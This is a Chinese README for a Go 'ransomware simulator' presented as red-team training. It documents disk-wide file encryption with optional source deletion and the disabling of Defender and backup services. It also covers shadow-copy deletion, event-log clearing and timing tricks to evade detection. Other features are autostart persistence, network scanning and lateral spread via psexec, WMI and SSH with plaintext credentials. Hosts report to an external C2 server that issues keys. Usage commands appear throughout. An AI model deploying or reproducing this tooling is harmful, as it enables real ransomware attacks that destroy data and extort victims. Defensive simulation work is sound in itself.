# 勒索软件模拟器 (Ransomware Simulator)

[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://golang.org) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) ![Version](https://img.shields.io/badge/Version-v3.8-blue.svg)

> **⚠️ 安全警告**：本工具仅用于网络安全培训和防御研究。禁止用于非法用途。使用前请确保在隔离环境中运行！

## 🚀 项目概述

这是一个用于红队演练和防御研究的勒索软件模拟器，模拟真实勒索软件的行为模式，包括文件加密、勒索信生成、C2通信等关键攻击链环节。项目遵循MIT许可证，旨在帮助安全团队测试防御方案和进行安全意识培训。

### 🆕 v3.8 更新摘要

- **断网可用性**：API 不可用时直接回退本地公钥，兼容 `public_key*.pem` / 任意 `*.pem`（自动提取 UUID 或按公钥指纹生成）与用户级密钥缓存；实在找不到密钥时给出中文提示并停留窗口，不再“闪退”
- **终端心跳**：客户端启动即上报，之后每 30 秒一次，正常退出补发 `stop`
- **在线管理后台**：`/admin` 查看在线/离线终端、IP、系统、版本与运行模式（需部署新版 `workers/_worker.js` 并配置 `ADMIN_TOKEN`）
- **系统设置**：`/admin/settings` 可修改管理登录密钥、密钥接口安全路径、心跳接收密钥与 Turnstile；存 D1、立即生效
- **后台驻留**：`--resident` 加密完成后保持进程、心跳与单实例锁
- **密钥保留**：`--keep-key` 密钥常驻内存并写入 `key_cache_<uuid>.json`，程序自身产物不会被扫描、加密或删除
- **定时任务后台化**：`--delay/--at` 自动脱离终端并在重启后继续有效（Windows 计划任务/启动文件夹，Linux `crontab @reboot`），Linux 无需 `nohup`
- **多架构**：新增 Windows ARM64、Linux arm64 与 armv7（32 位 ARM）、macOS arm64 产物

## ✨ 主要功能

### 🔒 核心功能
- **文件加密系统**：使用RSA-2048 + AES-256混合加密
- **多平台支持**：Windows/Linux/macOS 全平台兼容
- **并发加密处理**：多worker线程优化性能
- **大文件部分加密**：>1GB 文件自动使用头部+尾部+随机中间块的部分加密策略
- **密钥获取**：API优先获取密钥，失败自动回退本地公钥文件（v3.8 增强：宽松命名、公钥指纹 UUID、用户级缓存）
- **浏览器端解密**：通过 Web 页面输入 UUID 后直接在浏览器本地解密 .encrypted 文件

### 📜 勒索系统
- **多语言勒索信**：中/英文双语勒索模板
- **智能投放机制**：每个加密目录自动投放勒索信
- **壁纸修改模拟**：加密完成后自动生成勒索提示壁纸并设为桌面壁纸（Windows / Linux / macOS，本地生成，无第三方依赖）
- **提示文案随 `-remove` 变化**：默认（保留源文件）壁纸显示“本程序不会删除任何源文件”；使用 `-remove` 时壁纸额外显示“源文件已被删除”高亮提示，勒索信正文同步切换文案

  不删除源文件（默认）：

  ![勒索提示壁纸预览](docs/preview_wallpaper.png)

  删除源文件（`-remove`）：

  ![删除源文件时的壁纸预览](docs/preview_wallpaper_deleted.png)

### 🛡️ 攻击链模拟
- **服务停止攻击**：停止数据库、安全软件服务
- **内存清理技术**：清理数据库缓存、系统内存
- **进程守护解除**：停止守护进程和定时任务
- **数据库攻击**：针对企业数据库的专项攻击
- **隐身模式** (`--stealth-mode`)：禁用看门狗、断开数据库连接、清除缓存
- **行为控制** (`--no-stop-services`、`--no-kill-procs`、`--no-clear-logs`)：可跳过各阶段破坏性操作
- **隐身延迟** (`--aggressive-delay`)：操作间随机延迟，规避行为检测
- **后台驻留** (`--resident`)：加密完成后进程不退出，保持心跳与单实例锁，Ctrl+C 结束（v3.8）
- **密钥保留** (`--keep-key`)：密钥常驻内存并写入本地缓存，任务结束、`-remove`、再次扫描都不会删除（v3.8）

### ⏰ 定时触发（v3.7）
- **进程内定时**：`--delay`（等待时长）/ `--at`（绝对时刻），等待期间保持单实例锁并打印 ETA，支持 Ctrl+C 中断
- **自动后台化**：使用 `--delay/--at` 时自动脱离终端转入后台（Windows 脱离控制台，Linux/macOS `setsid`），终端可安全关闭，**Linux 不再需要 `nohup`**；`--foreground` 可保持前台等待
- **开机自启**：自动注册开机自启（Windows 计划任务 / 启动文件夹，Linux/macOS `crontab @reboot`），**重启后定时任务依旧有效**；`--no-autostart` 可关闭
- **随机抖动**：`--random-delay` 在定时基础上叠加 `0~X` 随机延迟，打乱固定时序特征
- **系统级计划任务**：`--persist-schedule` 注册任务后主进程退出，到点由系统唤起（Windows `schtasks`；Linux/macOS `systemd-run` → `at` → `crontab`），执行结束可用 `--schedule-cleanup` 自动清理

### 🛰️ 攻击面侦察（模拟攻击扫描，v3.7）
- **并发端口发现**：纯 TCP 连接探测（无漏洞利用、无口令爆破），内置企业常见服务端口与服务指纹映射
- **本机资产发现**：网卡私有网段/网关推导、监听端口（`netstat -ano` / `ss -tlnp`）、`arp -a` 邻居表
- **报告输出**：控制台表格 + `recon_report_<ts>.json` / `.csv`，结果可被 `--remote-auto` 直接消费
- **仅侦察模式**：`--scan-only` 只做发现与报告，不加密、不触碰系统

### 🌐 远程横向加密（v3.7）
- **编排模型**：控制端投放「加密器自身 + 公钥」到远端暂存目录并远程执行，最后回收远端日志
- **目标来源**：`--remote-hosts` / `--remote-hosts-file` / `--remote-auto`（消费侦察结果）
- **多通道**：Windows 控制端 `wmi` → `schtasks` → `psexec`（自动选择，`smb` 为仅投递）；Linux/macOS 控制端 `ssh`（`scp` 投递）
- **安全护栏**：默认只做连通性 + 投递演练且远端以 `-dry-run` 运行，必须显式 `--remote-confirm` 才会真实执行；`-remove` 不会自动透传
- **报告输出**：逐主机状态表 + `remote_report_<ts>.json`，远端日志回收到控制端程序目录

### 🔗 C2 通信（v3.8）
- **终端心跳**：客户端每 30 秒向 Cloudflare Worker 上报一次，管理后台据此判断在线状态
- **在线管理后台**：`/admin` 查看在线终端、IP、系统、版本、运行模式与最后心跳时间
- **密钥远程下发**：通过 Workers API 获取 RSA 密钥对

### 📊 日志与审计
- **详细日志记录**：成功/失败文件分别记录
- **操作过程追踪**：完整记录程序执行流程
- **日志自动分类**：按程序目录输出日志文件

## 📁 项目结构

```
ransom_simulator/
├── cmd/                              # 主程序源码目录
│   ├── encryptor/                   # 加密器
│   │   ├── windows/                 # Windows 特定代码
│   │   │   ├── main.go             # Windows 加密器主程序
│   │   │   ├── schedule.go         # 定时触发（进程内定时 + schtasks 计划任务）
│   │   │   ├── recon.go            # 攻击面侦察（端口发现 + 本机资产 + 报告）
│   │   │   ├── remote.go           # 远程横向加密编排（SMB/WMI/schtasks/PsExec）
│   │   │   └── wallpaper.ps1       # 勒索壁纸生成脚本（//go:embed 内嵌）
│   │   └── linux/                   # Linux/macOS 特定代码
│   │       ├── main.go             # Linux/macOS 加密器主程序
│   │       ├── schedule.go         # 定时触发（systemd-run / at / crontab）
│   │       ├── recon.go            # 攻击面侦察（ss/netstat + 端口发现）
│   │       ├── remote.go           # 远程横向加密编排（ssh/scp）
│   │       └── wallpaper.go        # 勒索壁纸生成（标准库 + 点阵字体）
│   └── decryptor/                   # 解密器
│       └── main.go                 # 解密器主程序
├── build/                           # 编译输出目录
│   ├── windows/                    # Windows 编译产物
│   │   ├── ransom_simulator.exe
│   │   └── decryptor.exe
│   ├── linux/                      # Linux 编译产物
│   │   ├── ransom_simulator_linux
│   │   ├── ransom_simulator_linux_static
│   │   └── decryptor_linux
│   ├── macos/                      # macOS 编译产物（通用二进制 amd64+arm64）
│   │   ├── ransom_simulator_macos
│   │   └── decryptor_macos
│   └── decryptor/                  # 跨平台解密器
│       └── decryptor.exe
├── scripts/                         # 构建脚本目录
│   ├── build_windows.bat           # Windows 构建脚本
│   ├── build_linux.sh              # Linux 构建脚本
│   ├── build_macos.sh              # macOS 构建脚本
│   └── build_decryptor.bat         # 解密器构建脚本
├── workers/                         # Cloudflare Worker
│   └── _worker.js                  # C2 服务器
├── docs/                            # 文档与预览图
│   └── preview_wallpaper.png       # 勒索壁纸效果预览
├── .gitignore                       # Git 忽略文件
├── go.mod                           # Go 模块文件
├── go.sum                           # Go 依赖校验文件
└── LICENSE                          # MIT 许可证
```

## 🚀 快速开始

### 从源码编译

#### Windows
```batch
cd scripts
build_windows.bat
```

#### Linux
```bash
cd scripts
chmod +x build_linux.sh
./build_linux.sh
```

#### macOS
```bash
cd scripts
chmod +x build_macos.sh
./build_macos.sh
```

### 使用预编译版本

编译后的程序位于 `build/` 目录，发布文件命名如下：

| 文件 | 平台 | 说明 |
| --- | --- | --- |
| `ransom_simulator.exe` | Windows x86_64 | 加密端 |
| `ransom_simulator_arm64.exe` | Windows ARM64 | 加密端 |
| `decryptor.exe` | Windows x86_64 | 解密端 |
| `decryptor_arm64.exe` | Windows ARM64 | 解密端 |
| `ransom_simulator_linux` | Linux x86_64 | 动态链接加密端 |
| `ransom_simulator_linux_static` | Linux x86_64 | 静态链接加密端 |
| `ransom_simulator_linux_arm64` | Linux arm64 | 动态链接加密端 |
| `ransom_simulator_linux_arm64_static` | Linux arm64 | 静态链接加密端 |
| `ransom_simulator_linux_arm` | Linux armv7 | 动态链接加密端（32 位 ARM） |
| `ransom_simulator_linux_arm_static` | Linux armv7 | 静态链接加密端（32 位 ARM） |
| `decryptor_linux` / `_arm64` / `_arm` | Linux | 各架构解密端 |
| `ransom_simulator_macos` | macOS | 通用二进制（amd64 + arm64） |
| `ransom_simulator_macos_arm64` | macOS Apple Silicon | arm64 单架构加密端 |

- **Windows**: `build/windows/*.exe`
- **Linux**: `build/linux/*`
- **macOS**: `build/macos/*`（另含 `decryptor_macos` 通用二进制）

### 基本使用

```bash
# 演习模式（不实际加密文件）
./ransom_simulator_linux -dry-run

# 启用日志功能
./ransom_simulator_linux -log -dry-run

# 指定工作线程数
./ransom_simulator_linux -workers=8 -log

# 加密特定目录
./ransom_simulator_linux -dir="/path/to/target" -log

# Windows 环境
ransom_simulator.exe -log -workers=4
```

## ⚙️ 命令行参数详解

| 参数               | 类型   | 描述                              | Windows | Linux | macOS | 默认值       | 备注                                 |
| ------------------ | ------ | --------------------------------- | ------- | ----- | ----- | ------------ | ------------------------------------ |
| -dir               | string | 指定攻击目标（目录或文件）        | ✅       | ✅     | ✅     | 系统根目录   | 逗号分隔多个目录                     |
| -ext               | string | 指定要加密的文件扩展名            | ✅       | ✅     | ✅     | 预定义扩展名 | 如：.txt,.pdf,.docx                  |
| -workers           | int    | 并发Worker线程数量                | ✅       | ✅     | ✅     | CPU核心数    | 建议根据系统资源调整                 |
| -dry-run           | bool   | 演习模式，不实际加密              | ✅       | ✅     | ✅     | false        | 用于测试和演示                       |
| -remove            | bool   | 加密后删除原文件                  | ✅       | ✅     | ✅     | false        | 高危操作，谨慎使用；壁纸与勒索信会同步显示“已删除源文件”提示 |
| -log               | bool   | 启用日志功能                      | ✅       | ✅     | ✅     | false        | 日志文件输出到程序所在目录           |
| --stealth-mode     | bool   | 隐秘模式，完全跳过阶段2破坏性操作 | ✅       | ✅     | ✅     | false        | 仅执行文件加密，不触碰系统进程       |
| --no-stop-services | bool   | 跳过停止数据库和安全服务          | ✅       | ✅     | ✅     | false        | 降低安全软件告警风险                 |
| --no-kill-procs    | bool   | 跳过终止进程操作                  | ✅       | ✅     | ✅     | false        | 避免 process kill 行为特征           |
| --no-clear-logs    | bool   | 跳过清除日志操作                  | ✅       | ✅     | ✅     | false        | 避免日志清除行为触发告警             |
| --aggressive-delay | int    | 各操作间随机延迟上限（毫秒）      | ✅       | ✅     | ✅     | 0            | 打乱行为时序，降低检测特征，0=不延迟 |
| -resident          | bool   | 加密完成后驻留后台                | ✅       | ✅     | ✅     | false        | 保持心跳与单实例锁，Ctrl+C 或结束进程退出 |
| -keep-key          | bool   | 密钥保存在内存与本地缓存          | ✅       | ✅     | ✅     | false        | 写入 `key_cache_<uuid>.json`；扫描/加密/删除均跳过 |
| -heartbeat-token   | string | 心跳接收密钥                      | ✅       | ✅     | ✅     | 环境变量 `RANSOM_HEARTBEAT_TOKEN` | 后台启用“心跳接收密钥”后必填，随心跳发送 `X-Heartbeat-Token` |
| --delay            | duration | 启动前等待时长（如 `30s`/`5m`/`2h`） | ✅       | ✅     | ✅     | 0            | 定时启动，默认自动转入后台；`--foreground` 可保持前台 |
| --at               | string | 定时启动时刻                      | ✅       | ✅     | ✅     | 空           | `2006-01-02 15:04:05`、`15:04`（已过则次日）、RFC3339；默认自动后台化 |
| --random-delay     | duration | 在定时基础上叠加 0~X 随机抖动     | ✅       | ✅     | ✅     | 0            | 规避固定时序特征                     |
| --persist-schedule | bool   | 注册系统级定时任务                | ✅       | ✅     | ✅     | false        | Win：`schtasks`；Linux/macOS：`systemd-run`→`at`→`crontab` |
| --foreground       | bool   | 定时任务保持前台等待              | ✅       | ✅     | ✅     | false        | 默认自动后台化（setsid/脱离控制台） |
| --no-autostart     | bool   | 不注册开机自启                    | ✅       | ✅     | ✅     | false        | 重启后需手动启动；默认自动注册 |
| --schedule-task-name | string | 定时任务名称                     | ✅       | ✅     | ✅     | RansomSimTask | 同名任务会被覆盖重建                |
| --schedule-cleanup | bool   | 任务执行结束后自动清理任务        | ✅       | ✅     | ✅     | true         | 避免残留持久化痕迹                   |
| --scan             | bool   | 启用攻击面侦察                    | ✅       | ✅     | ✅     | false        | 并发 TCP 端口发现 + 本机资产发现      |
| --scan-only        | bool   | 仅侦察并输出报告，不加密          | ✅       | ✅     | ✅     | false        | 只读演练，不触碰文件与系统           |
| --scan-targets     | string | 侦察目标（IP/CIDR/主机名，逗号分隔）| ✅       | ✅     | ✅     | 空           | `auto`=自动使用本机私有网段 + ARP 邻居 |
| --scan-targets-file | string | 侦察目标清单文件                 | ✅       | ✅     | ✅     | 空           | 每行一个目标，`#` 为注释              |
| --scan-ports       | string | 侦察端口列表（逗号分隔）          | ✅       | ✅     | ✅     | 内置常见端口  | 默认含 445/22/3389/3306/1433/6379 等  |
| --scan-workers     | int    | 侦察并发数                        | ✅       | ✅     | ✅     | 128          | 单机探测为串行，并发作用于主机维度    |
| --scan-timeout     | duration | 单端口探测超时                  | ✅       | ✅     | ✅     | 800ms        | 内网建议 300ms~1s                    |
| --scan-icmp        | bool   | 先用 ping 探活                    | ✅       | ✅     | ✅     | false        | 仅用于标记存活，端口探测始终执行      |
| --remote-hosts     | string | 远程目标（逗号分隔）              | ✅       | ✅     | ✅     | 空           | 支持 `user@host`、`host:port`        |
| --remote-hosts-file | string | 远程目标清单文件                 | ✅       | ✅     | ✅     | 空           | 每行一个目标，`#` 为注释              |
| --remote-auto      | bool   | 用侦察结果作为远程目标            | ✅       | ✅     | ✅     | false        | 需同时启用 `--scan`，取开放 445/22/5985/5986 的主机 |
| --remote-user      | string | 远程认证用户名                    | ✅       | ✅     | ✅     | 空           | 留空则使用当前会话凭据               |
| --remote-pass      | string | 远程认证口令                      | ✅       | ✅     | ✅     | 空           | Linux 端口令认证依赖 `sshpass`；Win 端明文出现在命令行 |
| --remote-domain    | string | 远程认证域                        | ✅       | —      | —      | 空           | 仅 Windows 控制端使用                |
| --remote-key       | string | SSH 私钥路径                      | —        | ✅     | ✅     | 空           | Linux/macOS 控制端推荐认证方式        |
| --remote-port      | int    | 远程目标端口                      | ✅       | ✅     | ✅     | 445 / 22     | 未指定时按通道推断（Win 445，SSH 22）|
| --remote-method    | string | 远程通道                          | ✅       | ✅     | ✅     | auto         | Win：`auto`/`smb`/`wmi`/`schtasks`/`psexec`；Unix：`auto`/`ssh`/`deploy-only` |
| --remote-staging   | string | 远端暂存目录                      | ✅       | ✅     | ✅     | `C:\ProgramData\RsSim` / `/tmp/.rs_sim` | Win 需为 `C:\path` 形式（自动映射为 `C$` 管理共享）|
| --remote-args      | string | 透传给远端 encryptor 的额外参数    | ✅       | ✅     | ✅     | 空           | 例如 `-workers 8 -ext .docx`（可用 `-dir` 覆盖沙箱目标）|
| --remote-confirm   | bool   | 确认真实执行远端加密              | ✅       | ✅     | ✅     | false        | 缺省仅连通性+投递演练，远端以 `-dry-run` 运行 |
| --remote-cleanup   | bool   | 执行后清理远端暂存目录            | ✅       | ✅     | ✅     | false        | 默认保留便于取证复核                 |

  > **注意**：壁纸篡改、桌面勒索信投放以及阶段 2 的破坏性操作仅在**非演习模式**（不加 `-dry-run`）时执行；`-dry-run` 演习模式不会修改文件或系统设置。

## 🔐 密钥管理

  程序采用 **API 优先获取密钥，失败回退本地密钥** 的策略。

### 1. 远程 API 模式（默认）

  程序启动时自动向以下接口请求 RSA 公钥：

```
POST https://encrypt.yangzifun.org/E56dSY
```

  **请求响应示例：**

```json
{
    "status": "success",
    "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "public_key_pem": "-----BEGIN PUBLIC KEY-----\n...",
    "private_key_pem": "-----BEGIN PRIVATE KEY-----\n..."
}
```

  - 每次加密请求会生成**全新的 RSA 密钥对**，返回 UUID 和 PEM 格式密钥
  - 私钥仅此一份，**请务必妥善保存 UUID**，用于后续解密
  - 密钥对存储在 Cloudflare D1 数据库的 `keys` 表中
  - 生成统计（总生成次数、最新UUID和时间）持久化在 `key_metrics` 表中，清理 `keys` 表不影响累计统计数据

### 2. 本地密钥模式（回退/离线）

  当 API 不可用时（网络断开、服务不可达、返回内容异常），程序**直接回退到本地公钥**，
  不会再因为联网失败而退出：

  **文件要求：**

```
程序目录/
├── ransom_simulator_linux        # 可执行文件
└── public_key_<uuid>.pem         # 公钥文件，例如：
    ├── public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem
```

  **公钥文件格式：**

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwL6+M4l4R/6mZRZz9cLr
...
-----END PUBLIC KEY-----
```

  **查找顺序与命名兼容：**

  - 优先程序目录，其次当前工作目录，最后用户级缓存目录
  - 严格命名 `public_key_<uuid>.pem` > `public_key*.pem`（如 `public_key.pem`）> 任意 `*.pem`
  - 损坏/非 RSA 的 PEM 会被自动跳过，继续尝试下一个候选文件
  - 文件名不含 UUID 时，程序按公钥指纹（SHA-256）生成稳定 UUID，同一把公钥每次运行得到同一 ID

  **公钥自动缓存：**

  - 联网成功后，下发的公钥会保存到程序目录 `public_key_<uuid>.pem`；
    程序目录不可写时额外缓存到用户配置目录：
    - Windows：`%AppData%\RansomSimulator\keys\`
    - Linux/macOS：`~/.config/RansomSimulator/keys/`
  - 之后断网运行会直接使用该缓存密钥

  **完全找不到密钥时：**

  - 控制台打印可操作提示（公钥放置路径与命名规则），并**停留 15 秒后退出**，
    避免双击运行时窗口一闪而过
  - `-dry-run` 演习模式只提示、不中止，仍可查看将被加密的文件清单

### 3. 终端心跳与在线管理

  程序启动后（阶段 2）立即上报一次心跳，之后每 **30 秒**上报一次，正常退出时补发一次 `stop`：

```
POST https://encrypt.yangzifun.org/api/heartbeat
Content-Type: application/json

{
  "id": "终端稳定指纹（主机名 + 系统 + 架构 + 用户名）",
  "hostname": "PC-ALICE",
  "username": "alice",
  "os": "windows",
  "arch": "amd64",
  "version": "v3.8",
  "mode": "dry-run | attack | remote | stealth",
  "key_uuid": "本次运行使用的加密密钥 UUID",
  "pid": 1234,
  "uptime_s": 3600,
  "event": "start | ping | stop"
}
```

  服务端把终端记录写入 D1 `terminals` 表；**超过 90 秒**未收到心跳即判定离线。管理后台地址：

```
https://encrypt.yangzifun.org/admin
```

  > 兼容说明：旧版客户端仍可使用 `GET/POST /beacon_check_in`，该端点仅记录日志、不参与在线统计。
  >
  > 若在管理后台“系统设置”里启用了**心跳接收密钥**，客户端需加 `--heartbeat-token <密钥>`（或环境变量 `RANSOM_HEARTBEAT_TOKEN`），
  > 请求会携带 `X-Heartbeat-Token`；未携带或错误将返回 401。

## 🎯 使用场景示例

### 场景1：企业数据库攻击测试

```bash
# 模拟对数据库服务器的攻击
./ransom_simulator_linux -log -dir="/var/lib/mysql,/opt/oracle" -workers=4
# 效果：停止数据库服务、清理内存缓存、加密数据库文件
```

### 场景2：安全防御演练

```bash
# 测试安全软件的防护能力
./ransom_simulator_linux -log -dry-run -ext=".conf,.key,.pem"
# 效果：记录所有潜在攻击目标，不实际加密
```

### 场景3：日志审计测试

```bash
# 测试日志系统的记录能力
./ransom_simulator_linux -log -workers=2 -ext=".log,.txt"
# 效果：生成详细日志文件，便于事后分析
```

### 场景4：内部红队演练

```bash
# 企业内部安全测试
./ransom_simulator_linux -log -workers=2 -ext=".sql,.db,.bak"
# 日志文件便于事后分析和汇报
```

### 场景5：隐秘模式测试

```bash
# 完全跳过阶段2，仅执行文件加密，不触碰任何系统进程
./ransom_simulator_linux -log --stealth -dir="/tmp/test" -ext=".txt,.doc"
# 效果：不调用 systemctl、不 kill 进程、不清理日志，最大限度降低安全软件告警
```

### 场景6：低特征模式测试

```bash
# 逐步放开阶段2操作，配合随机延迟打乱行为时序
./ransom_simulator_linux -log \
  --no-clear-logs --no-kill-procs \
  --aggressive-delay=3000 \
  -dir="/tmp/test"
# 效果：跳过日志清除和进程终止，操作间随机延迟 0-3 秒，避免触发时序检测
```

### 场景7：Windows 平台攻击测试

```cmd
# Windows 环境模拟攻击，自动遍历所有磁盘并加密
ransom_simulator.exe -log -workers=4
# 效果：停止 Windows 安全服务、删除卷影副本、清除事件日志、加密所有非系统分区文件
```

### 场景8：Windows 指定目录演练

```cmd
# Windows 下仅加密指定目录，用于演习
ransom_simulator.exe -log -dry-run -dir="C:\Users\TestUser\Documents" -ext=".docx,.xlsx,.pdf"
# 效果：记录所有潜在攻击目标，不实际加密，便于安全审计
```

### 场景9：Windows 隐身模式测试

```cmd
# Windows 隐身模式，仅执行文件加密，不触碰系统进程
ransom_simulator.exe -log --stealth-mode -dir="D:\test" -ext=".txt,.doc"
# 效果：不停止服务、不终止进程、不清除日志，最大限度降低安全软件告警
```

### 场景10：Windows 低特征模式测试

```cmd
# Windows 低特征模式，跳过日志清除和进程终止，配合随机延迟
ransom_simulator.exe -log --no-clear-logs --no-kill-procs --aggressive-delay=3000 -dir="D:\test"
# 效果：跳过日志清除和进程终止，操作间随机延迟 0-3 秒，避免触发时序检测
```

### 场景11：定时触发演练（v3.7）

```bash
# 延迟 30 分钟启动，并在定时基础上叠加 0~5 分钟随机抖动
./ransom_simulator_linux -log -dir="/tmp/test_data" --delay 30m --random-delay 5m

# 指定绝对时刻启动（当天该时刻已过则顺延到次日）
./ransom_simulator_linux -log -dir="/tmp/test_data" --at "2026-10-21 02:30:00"

# 注册系统级定时任务后主进程退出，到点由系统唤起（Windows 使用 schtasks）
ransom_simulator.exe -log -dir="D:\test" --at "02:30" --persist-schedule
```

> 说明：计划任务仅保留可执行参数（自动剔除定时参数并追加调度标记）；`-dry-run` 等其余参数会一并透传。

### 场景12：攻击面侦察演练（v3.7）

```bash
# 仅侦察：自动发现本机私有网段与 ARP 邻居，输出 JSON/CSV 报告，不加密任何文件
./ransom_simulator_linux -log --scan-only --scan-targets auto --scan-ports "445,22,3389,3306"

# 指定网段与单一目标，缩短超时并提高并发
./ransom_simulator_linux -log --scan-only --scan-targets "10.0.0.0/24,10.0.1.5" \
  --scan-workers 256 --scan-timeout 500ms
```

> 说明：侦察只有 TCP 连接探测与本机资产枚举，不含漏洞利用与口令爆破；单网段最多展开 1024 个地址，总目标上限 4096 个。

### 场景13：远程横向加密编排（v3.7）

```cmd
:: Windows 控制端：先做演练（只连通 + 投递，远端以 -dry-run 运行）
ransom_simulator.exe -log --remote-hosts "10.0.0.21,10.0.0.22" --remote-user Administrator --remote-pass "P@ssw0rd" --remote-method schtasks

:: 用侦察结果自动挑选目标（开放 445/22/5985/5986 的主机）
ransom_simulator.exe -log --scan --scan-targets auto --remote-auto --remote-method auto

:: 显式确认真实执行，并透传远端加密参数（含 -remove 需要显式写出）
ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administrator --remote-pass "P@ssw0rd" --remote-confirm --remote-args "-workers 8 -remove" --remote-cleanup
```

```bash
# Linux/macOS 控制端：使用私钥认证（推荐）
./ransom_simulator_linux -log --remote-hosts "ops@10.0.0.31,root@10.0.0.32" \
  --remote-key ~/.ssh/id_rsa --remote-method ssh --remote-cleanup
```

> 说明：默认（未加 `--remote-confirm`）只做连通性 + 投递演练，远端以 `-dry-run` 运行；远端目标目录默认为暂存目录下的沙箱 `target`，避免误伤真实数据。

### 场景14：加密后驻留与密钥保留

```bash
# Linux
./ransom_simulator_linux -log -dir="/tmp/test_data" -keep-key -resident
```

```cmd
:: Windows
ransom_simulator.exe -log -dir="D:\test" -keep-key -resident
```

> 加密完成后进程保持驻留并持续上报心跳（管理后台显示在线），密钥同时保留在内存与
> `key_cache_<uuid>.json`；按 `Ctrl+C` 结束驻留。缓存文件不会被删除，也不会被后续扫描/加密。

## 🔧 技术细节

### 密钥获取策略

1. **API 优先**：启动时通过 HTTPS 请求远程获取 RSA 公钥
2. **自动回退**：API 失败（超时/网络不可达/返回内容异常）时直接加载本地公钥，不中止任务
3. **UUID 管理**：API 模式由服务端生成 UUID；本地模式从文件名提取，文件名不含 UUID 时按公钥指纹生成
4. **完全离线**：本地密钥模式无需网络连接，可在隔离环境中使用
5. **可观测**：控制台输出当前使用的密钥来源；找不到密钥时给出可操作提示并停留窗口

### 后台驻留与密钥保留

  默认情况下程序在任务结束后倒计时退出。使用 `--resident` 与 `--keep-key` 可让加密后的进程继续驻留并长期持有密钥：

  **`--resident`（后台驻留）**

  - 加密与远程编排结束后不退出，继续以 30 秒间隔上报心跳，管理后台持续显示该终端在线
  - 保持单实例锁，重复启动会因锁冲突直接退出
  - 控制台打印驻留摘要（PID、密钥 UUID、缓存路径、心跳状态）
  - 退出方式：`Ctrl+C` 或结束进程；每 5 分钟写入一条驻留状态日志（`-log` 时）

  **`--keep-key`（密钥保留）**

  - **内存**：`rememberKey` 将 UUID 与公钥 PEM 常驻进程内存，驻留期间不释放
  - **缓存**：写入程序目录 `key_cache_<uuid>.json`；同时写入用户级缓存目录
    （Windows：`%AppData%\RansomSimulator\keys\`；Linux/macOS：`~/.config/RansomSimulator/keys/`），文件权限 `0600`
  - **缓存内容**：`uuid`、`public_key_pem`、`created_at`、`mode`、`remove_original`、`version`
  - **不被删除**：`public_key*.pem`、`key_cache_*.json`、勒索信、壁纸、日志与侦察/远程报告等程序自身产物，
    在扫描阶段即被跳过，因此 `-dir` 全格式加密模式与 `-remove` 都不会加密或删除它们
  - 用途：断网回退、演练审计、与解密流程（私钥仍在服务端或离线私钥文件）对照

  ```cmd
  :: 加密后驻留后台，并把密钥保存在内存与本地缓存
  ransom_simulator.exe -log -dir="D:\test" -keep-key -resident
  ```

### 攻击技术

#### 1. 服务停止攻击

  **Linux ：**

  - **数据库服务**：MySQL、PostgreSQL、MongoDB、Redis、Oracle
  - **安全软件**：阿里云安骑士、ClamAV、rkhunter、ossec
  - **监控工具**：Zabbix、Nagios、Cacti
  - **v3.4 低特征改进**：优先使用 SIGTERM 进程信号（`pgrep` + `kill`），`systemctl stop` 仅作为回退方案；移除 `systemctl disable`

  **Windows：**

  - **数据库服务**：MSSQLSERVER、SQLSERVERAGENT、MySQL80、PostgreSQL、MongoDB、Redis
  - **安全软件**：WinDefend（Windows Defender）、SecurityHealthService、WdNisSvc、Sense、MsMpSvc、MpKslDrv、WdBoot、WdFilter、WdNisDrv、McAfee、Sophos、SEP、Avast、Kaspersky
  - **备份服务**：vssvc（卷影复制）、wbengine（Windows 备份引擎）

#### 2. 内存清理技术

  **Linux：**

  - **数据库缓存**：MySQL缓存刷新、PostgreSQL缓存清理
  - **系统内存**：页面缓存清理、目录项清理
  - **网络缓存**：ARP缓存、DNS缓存清理

  **Windows：**

  - **SQL Server 缓存**：DBCC DROPCLEANBUFFERS、DBCC FREEPROCCACHE
  - **DNS 缓存**：`ipconfig /flushdns`
  - **事件日志**：`wevtutil cl` 清除系统/安全/应用程序事件日志

#### 3. 进程守护解除

  **Linux：**

  - **进程管理器**：supervisord、monit 等非系统级守护进程
  - **定时任务**：cron、atd
  - **v3.4 低特征改进**：移除对 `systemd`、`init`、`upstart`、`runit` 等系统级进程的 `pkill -9` 操作，仅对非系统级守护进程尝试 `systemctl stop`

  **Windows：**

  - **关键进程终止**：notepad.exe、winword.exe、excel.exe、sqlservr.exe、mysqld.exe、postgres.exe、mongod.exe、redis-server.exe 等
  - **进程终止方式**：`taskkill /F /IM` 强制终止

#### 4. 数据库链接解挂

  - **客户端进程**：mysql、psql、mongo、redis-cli（SIGTERM 信号）
  - **网络连接**：关闭数据库端口（3306、5432等）
  - **v3.4 低特征改进**：移除 `ss -K` 全网络连接关闭；`pkill -9` 改为 `pkill`（SIGTERM）

#### 5. 桌面壁纸篡改（Windows / Linux / macOS）

  各平台在文件加密完成后，都会生成一张勒索提示壁纸并立即设置为当前用户桌面背景：

  **Windows**

  - **生成方式**：`wallpaper.ps1` 通过 `//go:embed` 内嵌进二进制，运行时经 `powershell -Command` 调用 .NET `System.Drawing` 绘制 1920×1080 PNG，**纯离线、零第三方依赖**
  - **生效方式**：写入注册表 `HKCU\Control Panel\Desktop` 的 `Wallpaper`（图片路径）、`WallpaperStyle=10`（填充）、`TileWallpaper=0`，再通过 `syscall` 调用 Win32 `SystemParametersInfoW(0x0014, 0, <图片路径>, 0x0003)` 原生刷新
  - **输出位置**：`<程序所在目录>\ransom_wallpaper.png`；程序目录不可写时回退到 `%USERPROFILE%\Desktop`

  **Linux / macOS**

  - **生成方式**：`cmd/encryptor/linux/wallpaper.go` 使用标准库 `image`/`image/png` + 内置 5×7 点阵字体绘制 PNG，**无需系统字体、不依赖 ImageMagick 等外部工具**
  - **生效方式**：按序尝试各桌面环境命令设置壁纸——GNOME（`gsettings picture-uri` / `picture-uri-dark` / `picture-options`）、XFCE（`xfconf-query`）、LXDE（`pcmanfm`）、`feh --bg-fill`、`nitrogen`；macOS 使用 `osascript`
  - **输出位置**：`<程序所在目录>/ransom_wallpaper.png`；不可写时回退到用户主目录
